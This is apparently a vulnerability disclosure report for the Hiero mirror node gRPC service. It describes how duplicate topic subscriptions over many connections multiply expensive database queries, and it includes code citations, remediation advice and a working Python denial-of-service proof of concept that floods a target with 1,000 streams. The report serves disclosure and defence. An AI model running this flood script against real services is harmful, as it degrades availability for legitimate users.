### Title
Unbounded Parallel Historical DB Queries via Duplicate gRPC Subscriptions (Griefing / DoS)

### Summary
`TopicMessageServiceImpl.subscribeTopic()` creates a new, independent database retrieval query for every incoming subscription, with no deduplication, caching, or per-client subscription cap. An unprivileged attacker can open arbitrarily many TCP connections — each carrying up to 5 concurrent gRPC streams — all with identical filter parameters, causing a proportional multiplication of parallel historical queries against the database and degrading service for all users.

### Finding Description

**Exact code path:**

In `TopicMessageServiceImpl.subscribeTopic()` (lines 59–92), every call unconditionally creates a fresh cold `Flux` backed by a live DB query:

```java
Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
``` [1](#0-0) 

`TopicMessageRetriever.retrieve()` delegates to `TopicMessageRepositoryCustomImpl.findByFilter()`, which executes a full JPA/Hibernate query against the `topic_message` table on every invocation — no result cache, no shared publisher, no deduplication key:

```java
return typedQuery.getResultList().stream();
``` [2](#0-1) 

**Root cause — failed assumption:**

The design assumes that the number of concurrent subscriptions is bounded by infrastructure. In practice, the only server-side limit is `maxConcurrentCallsPerConnection = 5` in `NettyProperties`: [3](#0-2) 

This is a *per-connection* cap, not a global or per-IP cap. There is no limit on the number of TCP connections an attacker may open, no global subscriber ceiling, and no rate limiting anywhere in the `grpc` module (the throttling code in `web3/` is entirely separate and does not apply here). [4](#0-3) 

**Exploit flow:**

1. Attacker opens `N` TCP connections to the gRPC endpoint.
2. On each connection, attacker opens 5 concurrent `subscribeTopic` streams (the per-connection maximum), all with identical `{topicId, startTime, endTime}`.
3. Each stream independently triggers `topicMessageRetriever.retrieve(filter, true)` → a full DB scan of `topic_message` for the given filter.
4. Result: `N × 5` parallel, identical DB queries run simultaneously with zero sharing of results.

**Why existing checks fail:**

- `maxConcurrentCallsPerConnection = 5` only limits streams per TCP connection; the attacker simply opens more connections.
- `TopicMessageFilter` generates a fresh random `subscriberId` per subscription, so there is no equality key to detect duplicates.
- No global `subscriberCount` ceiling is enforced (the `AtomicLong subscriberCount` is only a metric gauge, not a gate). [5](#0-4) 

### Impact Explanation
Each duplicate subscription issues an independent, potentially large sequential scan of the `topic_message` table. With a topic that has millions of historical messages and a wide time range, each query is expensive. Multiplying this by hundreds or thousands of parallel streams exhausts database connection pool slots, I/O bandwidth, and CPU, causing query latency to spike for all legitimate users. The service degrades or becomes unavailable without any economic cost to the attacker.

### Likelihood Explanation
The attack requires only a gRPC client library and network access to the mirror node's gRPC port — no credentials, no special privileges, no tokens. It is trivially scriptable (e.g., a loop opening connections and calling `subscribeTopic` with a fixed filter). The attacker can sustain the attack indefinitely since each stream is long-lived (open-ended subscription). The attack is repeatable and requires no prior knowledge beyond the topic ID, which is public on-chain data.

### Recommendation

1. **Global subscription cap**: Enforce a configurable maximum total concurrent subscriptions (not just per-connection) and reject new subscriptions with `RESOURCE_EXHAUSTED` when the cap is reached.
2. **Per-IP / per-client cap**: Track active subscriptions by remote address and reject excess connections.
3. **Shared/cached historical publisher**: For identical filter parameters, share a single upstream `Flux` (e.g., via `Flux.publish().refCount()` or a `Cache` keyed on `{topicId, startTime, endTime}`) so N subscribers with the same filter issue only one DB query.
4. **Connection-level rate limiting**: Apply a token-bucket rate limiter at the gRPC interceptor layer (similar to the `web3` module's `ThrottleConfiguration`) to limit subscription establishment rate per IP.

### Proof of Concept

```python
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_NUM = 1234          # any valid topic
NUM_CONNECTIONS = 200
STREAMS_PER_CONN = 5      # maxConcurrentCallsPerConnection default

query = consensus_service_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
    consensusStartTime=timestamp_pb2.Timestamp(seconds=0),
    # no endTime → open-ended, keeps connection alive
)

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    streams = [stub.subscribeTopic(query) for _ in range(STREAMS_PER_CONN)]
    # drain each stream to keep DB queries running
    for s in streams:
        threading.Thread(target=lambda st=s: list(st), daemon=True).start()

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: 200 × 5 = 1000 parallel identical DB scans of topic_message
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L59-63)
```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L33-61)
```java
    public Stream<TopicMessage> findByFilter(TopicMessageFilter filter) {
        CriteriaBuilder cb = entityManager.getCriteriaBuilder();
        CriteriaQuery<TopicMessage> query = cb.createQuery(TopicMessage.class);
        Root<TopicMessage> root = query.from(TopicMessage.class);

        Predicate predicate = cb.and(
                cb.equal(root.get(TOPIC_ID), filter.getTopicId()),
                cb.greaterThanOrEqualTo(root.get(CONSENSUS_TIMESTAMP), filter.getStartTime()));

        if (filter.getEndTime() != null) {
            predicate = cb.and(predicate, cb.lessThan(root.get(CONSENSUS_TIMESTAMP), filter.getEndTime()));
        }

        query = query.select(root).where(predicate).orderBy(cb.asc(root.get(CONSENSUS_TIMESTAMP)));

        TypedQuery<TopicMessage> typedQuery = entityManager.createQuery(query);
        typedQuery.setHint(HibernateHints.HINT_READ_ONLY, true);

        if (filter.hasLimit()) {
            typedQuery.setMaxResults((int) filter.getLimit());
        }

        if (filter.getLimit() != 1) {
            // only apply the hint when limit is not 1
            entityManager.createNativeQuery(TOPIC_MESSAGES_BY_ID_QUERY_HINT).executeUpdate();
        }

        return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/GrpcProperties.java (L17-30)
```java
public class GrpcProperties {

    private boolean checkTopicExists = true;

    @NotNull
    private Duration endTimeInterval = Duration.ofSeconds(30);

    @Min(1)
    private int entityCacheSize = 50_000;

    @NotNull
    @Valid
    private NettyProperties netty = new NettyProperties();
}
```
